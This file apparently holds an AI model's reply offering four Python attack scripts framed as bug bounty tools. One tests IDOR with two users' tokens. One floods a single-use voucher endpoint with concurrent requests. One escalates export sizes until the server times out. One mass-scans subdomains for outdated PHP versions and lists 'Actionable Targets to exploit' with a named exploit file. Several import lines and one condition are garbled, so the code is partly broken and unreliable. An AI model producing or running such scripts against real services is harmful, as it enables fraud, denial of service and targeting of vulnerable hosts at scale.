@@ -1,0 +1,246 @@
+Below are direct, operational Python scripts for each of the four bug bounty methodologies. These scripts utilize clean logic, structured execution, and multi-threading, built using standard libraries like requests and concurrent.futures.
+------------------------------
+## 1. The Relations Script: Automating IDOR & Privilege Escalation Detection
+This script tests for Broken Object Level Authentication. It authenticates as User A, harvests target endpoints or resource IDs, and then attempts to access or modify those exact resources using User B's session tokens.
+
+import requestsimport sys
+# Equivalence Relation Mapping: Testing if User B can access User A's data classdef check_idor(base_url, user_a_token, user_b_token, resource_ids):
+    print(r'''
+    [*] Mapping Role Relations & IDOR Matrix...
+    ''')
+    
+    # Establish a session representing User B (The Unauthorized Attacker role)
+    session_b = requests.Session()
+    session_b.headers.update({
+        "Authorization": f"Bearer {user_b_token}",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) QA-Validator/1.0"
+    })
+
+    for resource_id in resource_ids:
+        # Construct the unique object endpoint path
+        target_url = f"{base_url.rstrip('/')}/api/v1/users/account/{resource_id}"
+        
+        try:
+            # Attempt to read User A's private resource using User B's authentication tokens
+            resp = session_b.get(target_url, timeout=10, verify=False)
+            
+            print(f"[+] Testing Object Path: .../account/{resource_id}")
+            print(f"[+] Status Code: {resp.status_code}")
+            
+            # If a separate user can successfully read or modify another user's restricted ID class
+            if resp.status_code == 200 and "private_data" in resp.text:
+                print(f"[CRITICAL VULNERABILITY CONFIRMED] IDOR found on resource: {resource_id}")
+                print(f"[+] Leak Output:\n{resp.text}\n")
+            elif resp.status_code in:
+                print("[-] Access Denied. Object boundaries correctly enforced by the server.\n")
+            else:
+                print("[-] Status 200 received but no clear object leak detected.\n")
+                
+            print("-" * 50)
+        except Exception as e:
+            print(f"[-] Connection failed for resource {resource_id}: {e}")
+if __name__ == "__main__":
+    # Replace these placeholders with your authorized staging/lab headers
+    TARGET_HOST = "https://your-authorized-target.com"
+    TOKEN_A = "USER_A_JWT_TOKEN_HERE"
+    TOKEN_B = "USER_B_JWT_TOKEN_HERE"
+    OBJECT_LIST = ["10441", "10442", "10443", "10444"] # Harvested IDs belonging to User A
+    
+    check_idor(TARGET_HOST, TOKEN_A, TOKEN_B, OBJECT_LIST)
+
+------------------------------
+## 2. The Proportions Script: Multi-Threaded Race Condition Voucher Blaster
+This script disrupts the 1:1 coupon code proportion by flooding the gateway with concurrent requests at the exact same millisecond using a thread pool, trying to apply one code multiple times simultaneously.
+
+import requestsimport sysfrom concurrent.futures import ThreadPoolExecutor, as_completed
+def send_race_request(session, url, payload, headers, request_id):
+    try:
+        # Fire the POST request instantly
+        resp = session.post(url, json=payload, headers=headers, timeout=10, verify=False)
+        return request_id, resp.status_code, resp.text
+    except Exception as e:
+        return request_id, "ERROR", str(e)
+def execute_race_condition(target_endpoint, session_cookie, voucher_code, threads=30):
+    print(r'''
+    [*] Initializing High-Velocity Proportional Thread Pool...
+    [*] Attempting to break 1:1 transaction ratio boundaries.
+    ''')
+    
+    url = target_endpoint.rstrip('/') + "/api/v1/cart/apply-voucher"
+    
+    headers = {
+        "Cookie": f"session={session_cookie}",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 Race-Condition-Validator/2.1"
+    }
+    
+    payload = {"coupon_code": voucher_code}
+    
+    # Establish a unified session manager
+    s = requests.Session()
+    
+    print(f"[*] Dispatching {threads} concurrent threads simultaneously...")
+    results = []
+    
+    # Fire all requests concurrently using a ThreadPoolExecutor
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {
+            executor.submit(send_race_request, s, url, payload, headers, i): i 
+            for i in range(threads)
+        }
+        
+        for future in as_completed(futures):
+            results.append(future.result())
+            
+    # Parse the asynchronous results matrix
+    success_count = 0
+    for req_id, status_code, body in results:
+        print(f"[Thread-{req_id}] Server Status Response: {status_code}")
+        # Customize this indicator check based on what your target application returns
+        if status_code == 200 and "Voucher applied successfully" in body:
+            success_count += 1
+            
+    print("\n" + "="*50)
+    print(f"[*] Total execution threads processed: {threads}")
+    print(f"[*] Total successful applications logged: {success_count}")
+    
+    if success_count > 1:
+        print(f"[HIGH-SEVERITY VULNERABILITY] Race Condition Confirmed! Code used {success_count} times.")
+    else:
+        print("[-] Target safe. Database successfully locked and isolated execution threads sequentially.")
+    print("="*50)
+if __name__ == "__main__":
+    TARGET = "https://your-testing-sandbox.com"
+    COOKIE = "ACTIVE_USER_SESSION_COOKIE_VALUE"
+    VOUCHER = "WELCOME100" # Single-use coupon code
+    
+    execute_race_condition(TARGET, COOKIE, VOUCHER, threads=25)
+
+------------------------------
+## 3. The Proportionality Script: Finding Resource Exhaustion (Asymmetric DoS)
+This script increases input limits dynamically to check if server processing time scales exponentially with user input. It identifies complex parsing features (like reports or database queries) that can be abused to consume excessive server resources.
+
+import requestsimport timeimport sys
+def verify_resource_exhaustion(base_url):
+    print(r'''
+    [*] Evaluating System Complexity Proportionality Matrix...
+    ''')
+    
+    endpoint = base_url.rstrip('/') + "/api/v2/reporting/export"
+    
+    # Test increments: Linearly multiplying the requested workload data size
+    workload_steps = [10, 100, 1000, 10000]
+    
+    for row_limit in workload_steps:
+        params = {
+            "format": "pdf",
+            "compress": "true",
+            "limit": row_limit  # User input altering database row lookup sizes directly
+        }
+        
+        start_time = time.time()
+        
+        try:
+            # Send the request and time the server response latency
+            resp = requests.get(endpoint, params=params, timeout=45, verify=False)
+            elapsed_time = time.time() - start_time
+            
+            print(f"[+] Workload Query Sent: limit={row_limit}")
+            print(f"[+] HTTP Server Status: {resp.status_code}")
+            print(f"[+] Total Processing Time logged: {elapsed_time:.2f} seconds")
+            
+            # Evaluate scaling factor flags
+            if elapsed_time > 15.0:
+                print(f"[!] Warning: Extreme execution lag discovered at limit={row_limit}.")
+                print("    Resource processing load is growing disproportionately to input size.")
+            
+            print("-" * 50)
+            
+        except requests.exceptions.Timeout:
+            print(f"[CRITICAL DOS CONFIRMED] Server completely frozen at limit={row_limit} (Timeout reached).")
+            print("    The input size successfully overwhelmed the CPU thread pool architecture.")
+            break
+        except Exception as e:
+            print(f"[-] Execution tracking interrupted: {e}")
+if __name__ == "__main__":
+    TARGET_ENVIRONMENT = "http://192.168.0.10:8080" # Test locally in your VM environment first
+    verify_resource_exhaustion(TARGET_ENVIRONMENT)
+
+------------------------------
+## 4. The Mass Scanner Script: Version Extraction Proportion Analyzer
+This script takes a text file containing thousands of target subdomains, performs parallel HTTP header harvesting, and strips out the 99% that are securely patched, isolating the vulnerable 1% for precision targeting.
+
+import requestsimport sysimport urllib3from concurrent.futures import ThreadPoolExecutor, as_completed
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def check_headers(url):
+    headers = {"User-Agent": "Mozilla/5.0 Mass-Header-Auditor/1.0"}
+    try:
+        # Use HEAD requests to scan fast without downloading full web pages
+        resp = requests.head(url, headers=headers, timeout=5, verify=False, allow_redirects=True)
+        
+        server_header = resp.headers.get("Server", "Unknown")
+        powered_by = resp.headers.get("X-Powered-By", "Unknown")
+        
+        return url, resp.status_code, server_header, powered_by
+    except Exception:
+        return url, "OFFLINE", None, None
+def run_mass_scan(subdomain_file, max_threads=50):
+    print(r'''
+    [*] Running Multi-Threaded Target Version Harvester...
+    ''')
+    
+    try:
+        with open(subdomain_file, "r") as f:
+            targets = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        print(f"[-] Error: Could not locate domain target file: {subdomain_file}")
+        sys.exit(1)
+        
+    print(f"[*] File parsed successfully. Loaded {len(targets)} active domains.")
+    print(f"[*] Deploying {max_threads} execution channels. Commencing sweep...\n")
+    
+    vulnerable_candidates = []
+    
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        futures = {executor.submit(check_headers, target): target for target in targets}
+        
+        for future in as_completed(futures):
+            url, status, server, php_version = future.result()
+            
+            if status != "OFFLINE":
+                # Check for legacy, unpatched version configurations (e.g., PHP 8.2.16, 8.1.20)
+                # This isolates targets from fully updated servers running safe releases like PHP 8.2.32
+                if "PHP/8.2." in php_version or "PHP/8.1." in php_version:
+                    # Filter out known safe patch levels to avoid false positives
+                    if not any(patched in php_version for patched in ["8.2.20", "8.2.32", "8.1.29"]):
+                        print(f"[POTENTIAL TARGET ISOLATED] -> {url} | Version: {php_version} | Server: {server}")
+                        vulnerable_candidates.append(f"{url} ({php_version})")
+                        
+    print("\n" + "="*50)
+    print(f"[*] Mass Audit complete. Total domains evaluated: {len(targets)}")
+    print(f"[*] Total isolated targets matching old version patterns: {len(vulnerable_candidates)}")
+    
+    if vulnerable_candidates:
+        print("\n[+] Actionable Targets to exploit using your specialized tools (like 52331.py):")
+        for item in vulnerable_candidates:
+            print(f"    -> {item}")
+    else:
+        print("[-] Scan complete. Zero legacy version signatures found across the target file infrastructure.")
+    print("="*50)
+if __name__ == "__main__":
+    # Create a local file named 'subdomains.txt' with your testing domains before running
+    # Example format inside the file:
+    # http://192.168.0.10:8080
+    # https://testing-sandbox.local
+    run_mass_scan("subdomains.txt", max_threads=40)
+
+## 🚀 Operational Workflow Checklist
+To use these scripts effectively within your bug bounty workflow, ensure you complete these preliminary setup steps:
+
+* Create your scope lists: Generate a subdomains.txt file using subdomain enumeration tools prior to launching the Mass Scanner Script.
+* Gather dual-account tokens: Authenticate with two distinct test accounts on your target platform to harvest the authorization tokens required by the Relations Script.
+* Identify dynamic inputs: Locate endpoints that handle heavy data parsing or generation routines to plug into the Proportionality Script target field.
+
+Let me know which script you want to customize further, or if you need help adding JSON logging to save the discovered vulnerabilities automatically.
+
